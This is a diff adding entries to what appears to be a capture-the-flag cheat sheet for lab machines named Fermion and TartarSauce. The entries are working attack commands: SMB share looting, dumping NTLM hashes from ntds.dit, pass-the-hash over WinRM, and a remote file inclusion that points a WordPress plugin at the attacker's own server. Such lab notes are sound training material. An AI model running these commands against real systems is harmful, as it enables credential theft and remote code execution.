@@ -736,6 +736,25 @@ nc -lvnp 389
 curl -s -X POST --data "ip=$LocalIP" http://$BoxIP/settings.php
 ```
 
+## Fermion chain quick reference
+
+```bash
+# Validate a Windows credential and enumerate SMB shares
+netexec smb $DCip -u $Username -p $Password -d $Domain --shares
+
+# Recursively collect an authenticated share into private loot
+cd $BoxDir/loot/extract
+smbclient //$DCip/extract -U "$Domain/$Username%$Password" -c 'recurse ON; prompt OFF; mget *'
+
+# Parse a matching AD database and SYSTEM hive offline
+secretsdump.py LOCAL -ntds $BoxDir/loot/extract/ntds.dit -system $BoxDir/loot/extract/SYSTEM -just-dc-ntlm
+
+# Validate the recovered Administrator NTLM hash without exposing it in notes
+netexec winrm $DCip -u Administrator -H $NTHash -d $Domain -x 'whoami && hostname'
+```
+
+Fermion also reinforces two checks before escalation: inspect exported scheduled-task XML, confirm the task is registered, and query Winlogon for readable autologon values when the advertised trigger is absent.
+
 ## 13. PASSWORD ATTACKS
 
 ```bash
@@ -814,6 +833,19 @@ fc /b C:\Users\$Username\job-original.bat C:\Path\to\task-script.bat
 curl -s -o /dev/null -w "%{http_code}" http://$BoxIP/$Path
 boxdone
 md5sum $File
+```
+
+```bash
+# TartarSauce: targeted WPScan plugin discovery and RFI proof
+wpscan --url "http://$BoxIP/webservices/wp/" --enumerate u,vp,vt \
+  --plugins-detection aggressive -o "$BoxDir/loot/wpscan-aggressive.txt"
+curl -sS -G "http://$BoxIP/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php" \
+  --data-urlencode "abspath=http://$LocalIP:8000/" --data-urlencode 'cmd=id'
+
+# TartarSauce: post-foothold timer and architecture checks
+sudo -l
+systemctl list-timers --all
+uname -m && file /bin/bash
 ```
 
 <!-- TODO --> <!-- Add technique-specific restore commands for services, sudoers, registry hives, and databases. -->
